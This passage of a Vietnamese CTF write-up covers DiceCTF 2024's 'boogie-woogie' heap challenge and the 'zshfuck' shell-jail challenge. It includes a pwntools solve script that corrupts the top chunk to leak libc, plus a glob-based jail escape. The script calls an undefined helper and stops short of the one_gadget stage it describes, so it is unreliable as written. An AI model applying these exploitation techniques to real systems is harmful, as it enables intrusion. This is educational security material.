<p>Leak libc từ 1 chunk được đưa vào unsorted bin là điều mà ta thường hay làm, nhưng ở bài này thì không đơn giản như vậy. Ta có thể allocate 1 chunk lớn thông qua hàm <code>scanf</code> nhưng sau đó sẽ bị free và consolidate với top-chunk nên ta sẽ không thể leak được.</p>
<p>Ta có thể ghi đè size của top-chunk:</p>
<ul>
<li>Khi mà size của top-chunk không đủ lớn để phân bổ, nó sẽ gọi đến <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L2547">sysmalloc</a> để phân bổ vùng nhớ mới và sẽ gọi đến <a href="https://elixir.bootlin.com/glibc/glibc-2.35/source/malloc/malloc.c#L4420">_int_free</a> để free top-chunk cũ nếu thõa mãn các điều kiện dưới đây</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> ((old_top <span style="color:#f92672">==</span> <span style="color:#a6e22e">initial_top</span> (av) <span style="color:#f92672">&amp;&amp;</span> old_size <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>) <span style="color:#f92672">||</span>
</span></span><span style="display:flex;"><span>  ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) (old_size) <span style="color:#f92672">&gt;=</span> MINSIZE <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>   <span style="color:#a6e22e">prev_inuse</span> (old_top) <span style="color:#f92672">&amp;&amp;</span>
</span></span><span style="display:flex;"><span>   ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) old_end <span style="color:#f92672">&amp;</span> (pagesize <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>));
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">assert</span> ((<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) (old_size) <span style="color:#f92672">&lt;</span> (<span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">long</span>) (nb <span style="color:#f92672">+</span> MINSIZE));
</span></span></code></pre></div><ul>
<li>Vậy nếu chỉnh sửa byte thứ 3 của top-chunk thành null-byte rồi cấp phát 1 chunk cực lớn thông qua hàm <code>scanf</code> là chúng ta đã có thể đưa top-chunk vào unsorted-bin.</li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span>pwndbg<span style="color:#f92672">&gt;</span> bins
</span></span><span style="display:flex;"><span>tcachebins
</span></span><span style="display:flex;"><span>empty
</span></span><span style="display:flex;"><span>fastbins
</span></span><span style="display:flex;"><span>empty
</span></span><span style="display:flex;"><span>unsortedbin
</span></span><span style="display:flex;"><span>all: <span style="color:#ae81ff">0x562a15d01ab0</span> <span style="color:#960050;background-color:#1e0010">—▸</span> <span style="color:#ae81ff">0x7f55a46a1ce0</span> <span style="color:#960050;background-color:#1e0010">◂—</span> <span style="color:#ae81ff">0x562a15d01ab0</span>
</span></span><span style="display:flex;"><span>smallbins
</span></span><span style="display:flex;"><span>empty
</span></span><span style="display:flex;"><span>largebins
</span></span><span style="display:flex;"><span>empty
</span></span></code></pre></div><h3 id="get-shell">Get SHELL</h3>
<p>Bây giờ ta đã có AAW với địa chỉ libc vừa được leak, đơn giản ta sẽ leak stack thông qua <code>__libc_envrion</code> rồi ghi đè <code>return address</code> về <code>one_gadget</code> .</p>
<h2 id="solve-script-1">Solve Script</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./boogie-woogie_patched&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>LOCAL:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process(<span style="color:#e6db74">&#39;./boogie-woogie_patched&#39;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">elif</span> args<span style="color:#f92672">.</span>DOCKER:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> remote(<span style="color:#e6db74">&#39;0&#39;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>        
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clap_str</span>(num1, num2):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;on:&#39;</span>, num1<span style="color:#f92672">.</span>encode() <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39; &#39;</span> <span style="color:#f92672">+</span> num2<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">clap</span>(v1,v2):
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;on:&#39;</span>, (str(v1)<span style="color:#f92672">+</span><span style="color:#e6db74">&#39; &#39;</span><span style="color:#f92672">+</span>str(v2))<span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">aar</span>(addr):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>addr<span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4m&#34;</span>)
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;L&#34;</span>)
</span></span><span style="display:flex;"><span>    ptr <span style="color:#f92672">=</span> u64(io<span style="color:#f92672">.</span>read(<span style="color:#ae81ff">6</span>)<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>,<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>))
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">{</span>addr<span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74"> </span><span style="color:#e6db74">{</span><span style="color:#ae81ff">1</span><span style="color:#f92672">+</span>i<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> _ <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">8</span>):
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> ptr
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">brute_heap_offset</span>():
</span></span><span style="display:flex;"><span>    idx <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">with</span> log<span style="color:#f92672">.</span>progress(<span style="color:#e6db74">&#39;Bruting&#39;</span>) <span style="color:#66d9ef">as</span> p:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>                idx <span style="color:#f92672">+=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>                p<span style="color:#f92672">.</span>status(<span style="color:#e6db74">&#34;attempt </span><span style="color:#e6db74">%i</span><span style="color:#e6db74">&#34;</span>, idx)
</span></span><span style="display:flex;"><span>                io <span style="color:#f92672">=</span> connect()
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception&#34;</span>)
</span></span><span style="display:flex;"><span>                trial_heap_offset <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x1995fe0</span>
</span></span><span style="display:flex;"><span>            
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>trial_heap_offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>                
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception&#34;</span>)
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>trial_heap_offset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>                p<span style="color:#f92672">.</span>success()
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> (io, trial_heap_offset <span style="color:#f92672">&gt;&gt;</span> <span style="color:#ae81ff">12</span> <span style="color:#f92672">&lt;&lt;</span> <span style="color:#ae81ff">12</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">except</span> <span style="color:#a6e22e">EOFError</span>:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">with</span> context<span style="color:#f92672">.</span>local(log_level<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;error&#39;</span>): io<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io, heap_page <span style="color:#f92672">=</span> brute_heap_offset()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>__dso_handle <span style="color:#f92672">=</span> leak_relative_ptr(<span style="color:#f92672">-</span><span style="color:#ae81ff">24</span>)
</span></span><span style="display:flex;"><span>elf<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span>  __dso_handle <span style="color:#f92672">-</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__dso_handle&#39;</span>]
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#39;__dso_handle = </span><span style="color:#e6db74">{</span>hex(__dso_handle)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;program base = </span><span style="color:#e6db74">{</span>hex(elf<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;offset to a heap page = </span><span style="color:#e6db74">{</span>hex(heap_page)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>maybe_tcache_perthread <span style="color:#f92672">=</span> heap_page <span style="color:#f92672">+</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;1 </span><span style="color:#e6db74">{</span>maybe_tcache_perthread<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;L&#34;</span>)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> io<span style="color:#f92672">.</span>recv(<span style="color:#ae81ff">1</span>) <span style="color:#f92672">==</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#39;</span><span style="color:#ae81ff">\x91</span><span style="color:#e6db74">&#39;</span>:
</span></span><span style="display:flex;"><span>        io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>    io<span style="color:#f92672">.</span>readuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;exception:&#34;</span>)
</span></span><span style="display:flex;"><span>    maybe_tcache_perthread <span style="color:#f92672">-=</span> <span style="color:#ae81ff">0x1000</span>
</span></span><span style="display:flex;"><span>    
</span></span><span style="display:flex;"><span>heap_base <span style="color:#f92672">=</span> maybe_tcache_perthread <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x8</span>
</span></span><span style="display:flex;"><span>log<span style="color:#f92672">.</span>info(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;offset to heap base = </span><span style="color:#e6db74">{</span>hex(heap_base)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>top_chunk <span style="color:#f92672">=</span> heap_base <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x0ab8</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;-3 </span><span style="color:#e6db74">{</span>top_chunk<span style="color:#f92672">+</span><span style="color:#ae81ff">2</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>encode())
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;-1 -&#34;</span><span style="color:#f92672">+</span><span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x800</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># cmd = &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># init-pwndbg</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># &#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(io, cmd)</span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><h1 id="mics---zshfuck">Mics - zshfuck</h1>
<h2 id="source-code-overview-2">Source code overview</h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/zsh
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>print -n -P <span style="color:#e6db74">&#34;%F{green}Specify your charset: %f&#34;</span>
</span></span><span style="display:flex;"><span>read -r charset
</span></span><span style="display:flex;"><span><span style="color:#75715e"># get uniq characters in charset</span>
</span></span><span style="display:flex;"><span>charset<span style="color:#f92672">=(</span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">${</span>(us..)charset<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>banned<span style="color:#f92672">=(</span><span style="color:#e6db74">&#39;*&#39;</span> <span style="color:#e6db74">&#39;?&#39;</span> <span style="color:#e6db74">&#39;`&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> <span style="color:#e6db74">${#</span>charset<span style="color:#e6db74">}</span> -gt <span style="color:#ae81ff">6</span> <span style="color:#f92672">||</span> <span style="color:#e6db74">${#</span>charset:|banned<span style="color:#e6db74">}</span> -ne <span style="color:#e6db74">${#</span>charset<span style="color:#e6db74">}</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>    print -P <span style="color:#e6db74">&#34;\n%F{red}That&#39;s too easy. Sorry.%f\n&#34;</span>
</span></span><span style="display:flex;"><span>    exit <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>print -P <span style="color:#e6db74">&#34;\n%F{green}OK! Got </span>$charset<span style="color:#e6db74">.%f&#34;</span>
</span></span><span style="display:flex;"><span>charset<span style="color:#f92672">+=(</span><span style="color:#e6db74">$&#39;\n&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># start jail via coproc</span>
</span></span><span style="display:flex;"><span>coproc zsh -s
</span></span><span style="display:flex;"><span>exec 3&gt;&amp;p 4&lt;&amp;p
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># read chars from fd 4 (jail stdout), print to stdout</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> IFS<span style="color:#f92672">=</span> read -u4 -r -k1 char; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>    print -u1 -n -- <span style="color:#e6db74">&#34;</span>$char<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span> &amp;
</span></span><span style="display:flex;"><span><span style="color:#75715e"># read chars from stdin, send to jail stdin if valid</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">while</span> IFS<span style="color:#f92672">=</span> read -u0 -r -k1 char; <span style="color:#66d9ef">do</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> <span style="color:#f92672">[[</span> ! <span style="color:#e6db74">${#</span>char:|charset<span style="color:#e6db74">}</span> -eq <span style="color:#ae81ff">0</span> <span style="color:#f92672">]]</span>; <span style="color:#66d9ef">then</span>
</span></span><span style="display:flex;"><span>        print -P <span style="color:#e6db74">&#34;\n%F{red}Nope.%f\n&#34;</span>
</span></span><span style="display:flex;"><span>        exit <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">fi</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e"># send to fd 3 (jail stdin)</span>
</span></span><span style="display:flex;"><span>    print -u3 -n -- <span style="color:#e6db74">&#34;</span>$char<span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">done</span>
</span></span></code></pre></div><h2 id="solution-2">Solution</h2>
<p>Đọc sơ qua thì dường như đây là 1 bài escape jail. Khi mà ta được define 6 kí tự (ngoài  *, ?, `) và sẽ thực thi được command chỉ sử dụng những kí tự mà ta đã define. Vì absolute path của binary <code>getflag</code> khá là dài nên mình sẽ dùng command <code>find .</code></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╭─</span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#f92672">~/</span>CTF<span style="color:#f92672">/</span>Pwnable<span style="color:#f92672">/</span><span style="color:#ae81ff">2024</span><span style="color:#f92672">/</span>dicectf<span style="color:#f92672">/</span>boogie<span style="color:#f92672">-</span>woogie <span style="color:#960050;background-color:#1e0010"></span>                                                                                                         <span style="color:#960050;background-color:#1e0010"></span> <span style="color:#960050;background-color:#1e0010">✔</span> <span style="color:#960050;background-color:#1e0010"></span> w1n_gl0ry<span style="color:#960050;background-color:#1e0010">@</span>phis1Ng <span style="color:#960050;background-color:#1e0010">─╮</span>
</span></span><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">╰─</span> nc mc.ax <span style="color:#ae81ff">31774</span>                                                                                                                                                                   <span style="color:#960050;background-color:#1e0010">─╯</span>
</span></span><span style="display:flex;"><span>Specify your charset: find .
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>OK<span style="color:#f92672">!</span> Got f i n d   ..
</span></span><span style="display:flex;"><span>find .
</span></span><span style="display:flex;"><span>.
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>y0u
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>y0u<span style="color:#f92672">/</span>w1ll
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>y0u<span style="color:#f92672">/</span>w1ll<span style="color:#f92672">/</span>n3v3r_g3t
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>y0u<span style="color:#f92672">/</span>w1ll<span style="color:#f92672">/</span>n3v3r_g3t<span style="color:#f92672">/</span>th1s
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>y0u<span style="color:#f92672">/</span>w1ll<span style="color:#f92672">/</span>n3v3r_g3t<span style="color:#f92672">/</span>th1s<span style="color:#f92672">/</span>getflag
</span></span><span style="display:flex;"><span>.<span style="color:#f92672">/</span>run
</span></span></code></pre></div><p>Bây giờ, để thực thi được <code>./y0u/w1ll/n3v3r_g3t/th1s/getflag</code> với số kí tự ít ỏi như vậy khá là khoai. Sau 1 hồi, mình tìm thấy tài liệu liên quan đến <a href="https://zsh.sourceforge.io/Doc/Release/Expansion.html#Glob-Operators">zsh</a> và chỉ cần define đúng 5 kí tự <code>./[!]</code> .</p>
<h2 id="final-payload">Final Payload</h2>
<p><img src="image-2.png" alt="alt text"></p>
<h1 id="reference">Reference</h1>
</div>
</article>

    <hr />
    <p class="articleTagsContainer">
        <span> </span>
        <strong>Tags:</strong>
        
            <a
                
                href="/tags/ctf/">#ctf</a>
        
            <a
                
                href="/tags/pwn/">#pwn</a>
        
    </p>






                    </main><footer>
    <hr />

<p><small>
        2024 &copy; Some copyright notice - <a href="https://example.com/license">my license</a>
    </small></p>
    <p><small>
        <a href='https://gitlab.com/gabmus/hugo-ficurinia'>Ficurinia theme</a> for <a href='https://gohugo.io'>Hugo</a> by <a href='https://gabmus.org'>Gabriele Musco</a>. Licensed under <a href='https://www.gnu.org/licenses/agpl-3.0.html'>GNU AGPLv3</a>.
    </small></p>
</footer>
</div>
            </div>
        </div>


</body>
</html>
